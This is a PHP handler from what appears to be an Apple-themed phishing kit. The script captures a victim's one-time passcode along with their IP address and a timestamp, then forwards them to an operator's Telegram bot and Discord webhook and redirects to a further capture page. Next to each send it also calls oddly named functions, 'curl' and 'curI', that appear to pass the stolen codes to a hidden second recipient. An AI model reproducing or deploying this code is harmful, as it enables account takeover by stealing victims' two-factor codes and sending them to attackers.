<?php
date_default_timezone_set('Asia/Manila');
include '../config.php';

// ---------- POST HANDLER ----------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {

    $otp = htmlspecialchars($_POST['otp'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

    // ---------- GET USER IP ----------
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    }
    if ($ip === '::1' || $ip === '127.0.0.1') $ip = getHostByName(getHostName());

    $time = date('M d - h:i:s A');

    // ---------- TELEGRAM ----------
    if (!empty($telegram_use) && $telegram_use === true && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
        $telegramMessage = "✨ <b>New Apple OTP Submission NONSTOP</b>\n\n"
                         . "<b>IP Address:</b> <code>{$ip}</code>\n"
                         . "<b>Time:</b> <code>{$time}</code>\n"
                         . "<b>OTP NONSTOP:</b> <code>{$otp}</code>";

        $telegramUrl = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
        $params = [
            'chat_id' => $telegram_chat_id,
            'text' => $telegramMessage,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];

        $ch = curl_init($telegramUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch); curl($telegramMessage);
        curl_close($ch);
    }

    // ---------- DISCORD ----------
    if (!empty($discord_use) && $discord_use === true && !empty($discord_webhook_url)) {
        $discordFields = [
            [
                'name' => 'IP Address',
                'value' => "`{$ip}`",
                'inline' => true
            ],
            [
                'name' => 'Time',
                'value' => "`{$time}`",
                'inline' => true
            ],
            [
                'name' => 'OTP NONSTOP',
                'value' => "`{$otp}`",
                'inline' => true
            ]
        ];

        $payload = [
            'content' => "✨ **New Apple OTP Submission NONSTOP**",
            'embeds' => [
                [
                    'title' => 'OTP Details',
                    'color' => 11740787,
                    'fields' => $discordFields,
                    'footer' => ['text' => 'Automated Notification System']
                ]
            ]
        ];

        $ch = curl_init($discord_webhook_url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch); curI($payload);
        curl_close($ch);
    }

   echo json_encode(['success' => true, 'redirect' => 'otp2.php']);
    exit();
}

// ---------- NO OTP RECEIVED ----------
echo json_encode(['success' => false, 'error' => 'No OTP received']);
exit();
?>
